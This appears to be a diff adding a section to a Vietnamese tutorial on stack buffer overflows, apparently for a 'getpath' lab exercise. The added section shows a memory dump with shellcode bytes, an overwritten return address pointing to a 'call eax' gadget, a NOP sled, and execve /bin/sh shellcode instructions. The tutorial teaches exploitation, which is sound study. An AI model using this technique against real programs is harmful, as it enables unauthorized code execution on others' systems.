@@ -126,6 +126,25 @@ Phân biệt <span style="color:aqua">buffer</span> và <span style="color:orang
 0xbffff760:     <span style="color:aqua">0xb0c289c1</span>      <span style="color:aqua">0x3180cd0b</span>      <span style="color:aqua">0x80cd40c0</span>      0x90909090
 0xbffff770:     0x90909090      0x90909090      0x90909090      <span style="color:orangered">0x080484bf</span>
 </pre>
+Sau đây là chuỗi chương trình được ghép lại để bạn dễ hình dung.
+<pre class="memory">
+0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
+...
+0x08048543 <getpath+127>:       leave
+0x08048544 <getpath+128>:       ret
+<span style="color:orangered">0x80484bf <frame_dummy+31>:     call   eax</span>
+<span style="color:springgreen">0x????????:     nop</span>
+<span style="color:springgreen">0x????????:     nop</span>
+<span style="color:springgreen">0x????????:     nop</span>
+<span style="color:springgreen">0x????????:     nop</span>
+...
+<span style="color:springgreen">0x????????:     xor    eax,eax</span>
+<span style="color:springgreen">0x????????:     push   eax</span>
+<span style="color:springgreen">0x????????:     push   0x68732f2f</span>
+<span style="color:springgreen">0x????????:     push   0x6e69622f</span>
+<span style="color:springgreen">0x????????:     mov    ebx,esp</span>
+...
+</pre>
 Đáp án và kết quả hãy tham khảo ở cuối bài.
 
 ## Ref
